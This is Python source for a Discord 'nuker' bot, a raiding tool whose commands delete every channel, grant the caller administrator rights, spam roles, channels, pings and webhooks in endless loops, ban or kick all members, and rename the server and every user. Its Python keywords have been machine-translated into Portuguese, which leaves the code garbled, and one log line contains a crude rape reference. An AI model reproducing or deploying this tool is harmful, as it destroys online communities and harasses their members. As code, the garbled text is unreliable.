'' '
Femboyed por oAaron # 0001
'' '
de permissões de importação discord
importar discórdia, aleatório, tempo
import json
de discord.ext importar comandos, tarefas
importar os 
importar colorama
importar assíncio
da importação de colorama Fore
from discord import Embed
colorama.init ()
intents = discord.Intents.all ()
bot = commands.Bot (command_prefix = ">", intents = intents)
bot.remove_command ("ajuda")
com open ('config.json') como f:
    dados = json.load (f)
    token = data ["TOKEN"]
@ bot.event
assíncrono def on_ready ():
    imprimir (f '' '
{Fore.LIGHTCYAN_EX} ╔═╗┌─┐┌┬┐┌─┐┌─┐┬ ┌─┐  
{Fore.LIGHTCYAN_EX} ╠═╣└─┐ │ ├┤ │ ││ │ │  
{Fore.LIGHTCYAN_EX} ╩ ╩└─┘ ┴ └ └─┘┴─┘└─┘  
{Fore.LIGHTCYAN_EX} ╔╗╔┬ ┬┬┌─┌─┐┬─┐        
{Fore.LIGHTCYAN_EX} ║║║│ │├┴┐├┤ ├┬┘        
{Fore.LIGHTCYAN_EX} ╝╚╝└─┘┴ ┴└─┘┴└─     
Conectado e pronto <3                             
'' ')

@ bot.command ()
assíncrono def d (ctx, channel_id = "all"):
  aguarde ctx.message.delete ()
  if channel_id == "all":
    para o canal em ctx.guild.channels:
      if channel.id! = 834134636678479902:
        aguarde channel.delete ()
      senão:
        Prosseguir
    guild = ctx.message.guild
    esperar guild.create_text_channel ("nuked")
    imprimir ("Nuked Todos os Canais")
    Retorna
  senão:
    tentar:
      channel = ctx.get.channel (id = channel_id)
      aguarde channel.delete ()
    exceto:
      e2 = discord.Embed (title = "Invaild Channel ID.", cor = 0xaf1aff)
      aguarde ctx.send (embed = e2)
    Retorna

@ bot.command (pass_context = True)
assíncrono def admin (ctx):
    tentar:
        guild = ctx.guild
        role = await guild.create_role (name = "Astfolo Nuker", permissions = discord.Permissions (8), color = discord.Colour (000000))
        authour = ctx.message.author
        aguarde ctx.message.delete ()
        aguarde authour.add_roles (papel)
        imprimir ("Te dei admin <3")
    exceto:
        print ("Não foi possível fornecer o administrador :(")

@ bot.command ()
async def rspam (ctx):
 enquanto verdadeiro:
   aguarde ctx.guild.create_role (name = "Astfolo NUKER EXECUTE VOCÊ")
   imprimir ("Funções de spam <3")
@ bot.command ()
async def transrspam (ctx):
 enquanto verdadeiro:
   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0x0EF5F6))
   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFFFFF))
   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFA3FB))
   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0xFFFFFF))
   esperar ctx.guild.create_role (name = "Astfolo NUKER RUNS YOU", color = discord.Colour (0x0EF5F6))
   imprimir ("Funções de spam <3")
@ bot.command ()
assíncrono def rdelete (ctx):
  total_roles = ""
  para função em ctx.guild.roles:
    tentar:
      aguarde role.delete ()
    exceto:
      passar 
  embed = Embed (title = "Done Deleting All Roles", color = 0xaf1aff)
  aguarde ctx.send (embed = embed)
  aguarde ctx.message.delete ()


@ bot.command ()
assíncrono def cspam (ctx, times_reapet = 10, name_of_channel = "default"):
  para tempos no intervalo (times_reapet):
    guild = ctx.message.guild
    esperar guild.create_text_channel (name_of_channel)
  em3 = discord.Embed (title = f "Im concluído spamming *** {times_reapet} *** quantidade de canais nomeados *** {name_of_channel} ***", color = 0xaf1aff)
  imprimir (f "Canais {times_reapet} com spam <3")
  aguarde ctx.message.delete ()
  aguarde ctx.send (embed = em3)

@ bot.command ()
assíncrono def vcspam (ctx, times_reapet = 10, name_of_channel = "default"):
  para tempos no intervalo (times_reapet):
    guild = ctx.message.guild
    aguarde guild.create_voice_channel (name_of_channel)
  em3 = discord.Embed (title = f "Im concluído spamming *** {times_reapet} *** quantidade de canais de voz chamados *** {name_of_channel} ***", color = 0xaf1aff)
  imprimir (f "Canais de voz {times_reapet} com spam <3")
  aguarde ctx.message.delete ()
  aguarde ctx.send (embed = em3)

@ bot.command ()
async def banAll (ctx):
 embed = discord.Embed (title = "Concluído Banindo Todos os Membros", color = 0xaf1aff)
 aguarde ctx.send (embed = embed)
 aguarde ctx.message.delete ()
 imprimir ("Todos os membros banidos <3 ~")
 para usuário em ctx.guild.members:
        tentar:
            aguarde user.ban ()
        exceto:
           passar
@ bot.command ()
assíncrono def kickAll (ctx):
 embed = discord.Embed (title = "Concluído Banindo Todos os Membros", color = 0xaf1aff)
 aguarde ctx.send (embed = embed)
 aguarde ctx.message.delete ()
 print ("Expulsou todos os membros <3 ~")
 para usuário em ctx.guild.members:
        tentar:
            aguarde user.kick ()
        exceto:
           passar

@ bot.command ()
async def help (ctx):
 embed1 = Embed (title = "Astolfo Nuker Help", color = 0xaf1aff)
 embed1.add_field (name = "> help", value = "Sends This Message", inline = False)
 embed1.add_field (name = "> cspam [Amount] Channel Name", value = "Spams Channels", inline = True)
 embed1.add_field (name = "> d all", value = "Nukes All Channels", inline = False)
 embed1.add_field (name = "> banAll", value = "Bans todos os membros", inline = False)
 embed1.add_field (name = "> pingspam", value = "Bloqueia todos os canais e pings de spam", inline = False) 
 embed1.add_field (name = "> admin", value = "Dá ao usuário Admin.", inline = False)
 embed1.add_field (name = "> vcspam [Amount] [Channel Name]", value = "Spams Voice Channels", inline = False)  
 embed1.add_field (name = "> servername [Name]", value = "Changes Server Name", inline = False)
 embed1.add_field (name = "> nickall [Name]", value = "Changes Everyones Names", inline = False)
 embed1.add_field (name = "> rspam", value = "Spams Roles", inline = False)
 embed1.add_field (name = "> rdelete", value = "Deletes All Roles Below the Bot", inline = False)
 embed1.add_field (name = "> kickAll", value = "Kicks All", inline = False)
 embed1.add_field (name = "> transrspam", value = "envia spams para funções como a sinalização trans: flusuhed:", inline = False)
 embed1.add_field (name = "> lagspam", value = "Lags Peoples Discords", inline = False)
 embed1.set_image (url = "https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
 embed1.set_footer (text = "Por oAaron")
 embed2 = await ctx.send (embed = embed1)
 tempo.sono (10)
 aguarde embed2.delete ()
 aguarde ctx.message.delete ()


@ bot.command ()
async def pingspam (ctx):
    guild = ctx.message.guild
    aguarde ctx.guild.edit (name = "SERVER WIZZED")
    imprimir ("canais de estupro <3")
    últimos = "a: b: c: d: e: f: g: h: i: j: k: l: m: n: o: p: q: r: s: t: u: v: w: x : y:,: +: *: /: #: "
    lattersL = latters.split ()
    enquanto verdadeiro:
      para tempo no intervalo (random.randint (4,10)):
        r1 = random.choice (lattersL)
      tentar:
        esperar guild.create_text_channel ("nuked")
        esperar guild.create_voice_channel ("wizzed")
      exceto:
        passar 
      para canal em ctx.guild.text_channels:
        tentar:
          webhook = discord.utils.get (await ctx.channel.webhooks (), name = 'Spammer')
          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
          esperar ctx.channel.create_webhook (name = "wizzed pela ferramenta")
          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
          esperar ctx.channel.create_webhook (name = "wizzed")
          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
          esperar ctx.channel.create_webhook (name = "wizzed pela ferramenta")
          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
          esperar ctx.channel.create_webhook (name = "wizzed")
          await channel.send (f "Nuked! @everyone https://discord.gg/A7nAbRFdjD A FERRAMENTA EXECUTA VOCÊ {r1}")
          aguarde webhook.send ()
        exceto:
          passar 
@ bot.command ()
async def lagspam (ctx):
  enquanto verdadeiro:
    para canal em ctx.guild.text_channels:
      esperar channel.send (": chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains:: chains :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes :: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias:: cadeias::correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes:: correntes: : chains:: chains:: chains:: chains:: chains:: chains: ")
      imprimir ("Canais atrasados")
@ bot.command ()
async def servername (ctx, name = None): 
  se nome! = Nenhum:
    aguarde ctx.guild.edit (name = f "{name}")
    imprimir ("Nome do servidor alterado")
    em200 = Embed (color = 0xaf1aff, title = f "Alterou o nome do servidor para: *** {ctx.guild.name} ***")
    em2001 = aguarda ctx.send (embed = em200) 
    tempo.sono (8)
    aguarde em2001.delete ()
  senão:  
    em100 = Incorporar (cor = 0xaf1aff, título = ctx.guild.name)
    em1001 = aguarda ctx.send (embed = em100)
    tempo.sono (8)
    aguarde em1001.delete ()
@ bot.command ()
async def nickall (ctx, *, name = "! TOOL RUNS YOU"):
  imprimir ("Nicking All")
  para membro em ctx.guild.members:
    tentar:
      aguardar member.edit (apelido = nome)
    exceto:
      passar 



bot.run (token)
